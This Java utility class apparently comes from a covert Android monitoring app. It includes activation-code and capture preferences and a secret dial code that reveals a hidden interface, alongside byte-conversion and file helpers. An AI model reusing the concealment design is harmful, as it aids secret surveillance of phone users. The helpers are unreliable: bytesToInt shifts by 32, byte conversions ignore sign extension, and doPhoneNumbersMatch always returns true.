package com.vvt.android.syncmanager.utils;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.io.Writer;
import java.text.DateFormat;
import java.text.SimpleDateFormat;

import android.content.Context;
import android.content.SharedPreferences;

import com.fx.dalvik.resource.StringResource;
import com.fx.dalvik.util.FxLog;
import com.fx.dalvik.util.GeneralUtil;
import com.vvt.android.syncmanager.Customization;
import com.vvt.android.syncmanager.control.Main;

public abstract class Common {

//------------------------------------------------------------------------------------------------------------------------
// PRIVATE API
//------------------------------------------------------------------------------------------------------------------------

	private static final String TAG = "Common";
	private static final boolean LOCAL_DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ? LOCAL_DEBUG : false;
	@SuppressWarnings("unused")
	private static final boolean LOCAL_LOGD = Customization.DEBUG ? LOCAL_DEBUG : false;
	
	private static final String COMMON_PREFERENCES = "com.mobilefonex.mobilebackup.utils.preferences";
	
//------------------------------------------------------------------------------------------------------------------------
// PUBLIC API
//------------------------------------------------------------------------------------------------------------------------
    
	public static final int ERROR_INT = -1;
	public static final int ERROR_SHORT = -1;
	public static final int ERROR_INTERVAL = -1;
	public static final String ERROR_STRING = "Error";

	public static final int NOTFOUND_INT = -2;
	
	public static final String PREFERENCES_KEY_ACTIVATION_CODE = "com.mobilefonex.mobilebackup.control.ActivationCode";
	public static final String PREFERENCES_KEY_CAPTURE_ENABLED = "com.mobilefonex.mobilebackup.control.CaptureEnabled";
	
	public static final String UTF_8 = "UTF-8";
	
	public static String getCodeToRevealUI() { 
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "getCodeToRevealUI # ENTER ...");
		}
	
		String codeToRevealUi = null;
		
		String activationCode = Main.getInstance().getLicenseManager().getActivationCode();
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "getCodeToRevealUI # Current activation code '" + activationCode + "'");
		}
				
		if (GeneralUtil.isNullOrEmptyString(activationCode)) {
			codeToRevealUi = StringResource.DEFAULT_FLEXI_KEY;
		}
		else codeToRevealUi = "*#" + activationCode;

		if (LOCAL_LOGV) FxLog.v(TAG, "getCodeToRevealUI # Code to reveal UI '" + codeToRevealUi + "'");
		return codeToRevealUi;
	}
	
	public boolean doPhoneNumbersMatch(String aPhoneNumberOne, String aPhoneNumberTwo) { if (LOCAL_LOGV) FxLog.v(TAG, "doPhoneNumbersMatch # ENTER ...");
	
		return true;
	}
	
	public static SharedPreferences getPreferences() { if (LOCAL_LOGV) FxLog.v(TAG, "getPreferences # ENTER ...");

		return Main.getContext().getSharedPreferences(COMMON_PREFERENCES, Context.MODE_PRIVATE);
	}
	
	/**
	 * Converts the data bytes to a string using format 1. 
	 */
	public static String bytesToString1(byte[] aData) {		
		StringBuilder aStringBuilder = new StringBuilder();
		
		if (aData != null) for (int i = 0 ; i < aData.length ; i++) aStringBuilder.append(String.format(" [%2d]=%02X", i, aData[i]));
		return aStringBuilder.toString();
	}
	
	/**
	 * Converts the data bytes to a string using format 2. 
	 */
	public static String bytesToString2(byte[] aData) {		
		StringBuilder aStringBuilder = new StringBuilder();
		
		if (aData != null) {
			for (int i = 0 ; i < aData.length ; i++) {				
				byte aByte = aData[i];
				char aChar = (char) aByte;
				
				if ((aChar >= 'a' && aChar <= 'z') || 
					(aChar >= 'A' && aChar <= 'Z') || 
					(aChar >= '0' && aChar <= '9') || 
					(aChar == '@') ||
					(aChar == '/') ||
					(aChar == ' ') || 
					(aChar == '.')) {
					aStringBuilder.append(aChar);
				} 
				else aStringBuilder.append(String.format("\\x%02X", aByte));
			}
		}
		
		return aStringBuilder.toString();
	}
	
	/**
	 * Converts the data bytes to a string using format 3. 
	 */
	public static String bytesToString3(byte[] aData) {
		StringBuilder aStringBuilder = new StringBuilder();
		
		if (aData != null) {
			boolean aAddSpaceFlag = false;
			aStringBuilder.append("<");
			for (int i = 0 ; i < aData.length ; i++) {
				if (aAddSpaceFlag) {
					aStringBuilder.append(" ");
					aAddSpaceFlag = false;
				}
				
				byte b = aData[i];
				aStringBuilder.append(String.format("%02x", b));
				if (i % 4 == 3) aAddSpaceFlag = true;
			}
			aStringBuilder.append(">");
		}
		
		return aStringBuilder.toString();
	}

	/**
	 * Converts two bytes of data in the given byte array to short value.
	 */
	public static short bytesToShort(byte[] aData, int aStartIndex, boolean aBigendian) {		
		short aShort;
		
		if (aBigendian) aShort = (short) ((aData[aStartIndex] << 8) | aData[aStartIndex + 1]);
		else 			aShort = (short) ((aData[aStartIndex + 1] << 8) | aData[aStartIndex]);
		
		return aShort;
	}
	
	/**
	 * Converts a short number to 2 bytes of byte array.
	 */
	public static byte[] shortToBytes(short aShort) {		
		byte[] aBytes = new byte[2];
		
		aBytes[0] = (byte) ((aShort & 0xff00) >> 8);
		aBytes[1] = (byte) (aShort & 0x00ff);
		
		return aBytes;
	}
	
	/**
	 * Converts four bytes of data in the given byte array to int value.
	 */
	public static int bytesToInt(byte[] aData, int aStartIndex, boolean aBigendian) {		
		int aInt;
		
		if (aBigendian) {
			aInt = aData[aStartIndex] << 32 | 
					aData[aStartIndex + 1] << 16 | 
					aData[aStartIndex + 2] << 8 | 
					aData[aStartIndex + 3];
		} 
		else {
			aInt = aData[aStartIndex + 3] << 32 | 
					aData[aStartIndex + 2] << 16 | 
					aData[aStartIndex + 1] << 8 | 
					aData[aStartIndex];
		}
		
		return aInt;
	}
	
	/**
	 * Converts stack trace for the given throwable object (e.g. <code>Exception</code>) to a string.
	 */
	public static String stackTraceToString(Throwable aThrowable) { if (LOCAL_LOGV) FxLog.v(TAG, "stackTraceToString # ENTER ...");
		
		final Writer aWriter = new StringWriter();
		final PrintWriter aPrintWriter = new PrintWriter(aWriter);
		aThrowable.printStackTrace(aPrintWriter);
		return aWriter.toString();
	}
	
	public static void printStackTrace(Throwable aThrowable) { if (LOCAL_LOGV) FxLog.v(TAG, "printStackTrace # ENTER ...");
		
		FxLog.e(TAG, Common.stackTraceToString(aThrowable));
	}
	
	/**
	 * Writes the given byte array to the specified file name.
	 */
	public static void writeByteArrayToFile(byte[] byteArray, String fileName) { if (LOCAL_LOGV) FxLog.v(TAG, "writeByteArrayToFile # ENTER ...");
		
		FileOutputStream aFileOutputStream = null;
		
		try { aFileOutputStream = Main.getContext().openFileOutput(fileName, 0); } 
		catch (FileNotFoundException aFileNotFoundException) { throw new RuntimeException(aFileNotFoundException); }
		
		try { aFileOutputStream.write(byteArray); } 
		catch (IOException aIOException) { throw new RuntimeException(aIOException); }
		
		try { aFileOutputStream.close(); } 
		catch (IOException aIOException) { throw new RuntimeException(aIOException); }
	}

	public static DateFormat getDateFormatter() { if (LOCAL_LOGV) FxLog.v(TAG, "getDateFormatter # ENTER ...");
	
		DateFormat aDateFormat = new SimpleDateFormat("dd/MM/yy HH:mm:ss");
		return aDateFormat;
	}
		
	public static void copyFile(String aSourceFile, String aDestinationFile) throws IOException { if (LOCAL_LOGV) FxLog.v(TAG, "copyFile # ENTER ...");
		
		if (LOCAL_LOGV) FxLog.v(TAG, String.format("Copying %s to %s...", aSourceFile, aDestinationFile));
		
		File aOneFile = new File(aSourceFile);
		File aTwoFile = new File(aDestinationFile);
		InputStream aInputStream = new FileInputStream(aOneFile);

		// To append the file.
		// OutputStream aOutputStream = new FileOutputStream(aTwoFile, true);

		// To overwrite the file.
		OutputStream aOutputStream = new FileOutputStream(aTwoFile);

		byte[] aBuffer = new byte[1024];
		int aLengthInt;
		while ((aLengthInt = aInputStream.read(aBuffer)) > 0) { aOutputStream.write(aBuffer, 0, aLengthInt); }
		aInputStream.close();
		aOutputStream.close();
	}
	
	/**
	 * Creates the specified directory and its non-existing ancestors. 
	 */
	public static void createDirectory(String aDirectoryPath) throws IOException { if (LOCAL_LOGV) FxLog.v(TAG, "createDirectory # ENTER ...");
		
		if (!(new File(aDirectoryPath)).mkdirs()) { throw new IOException(); } 
	}
}
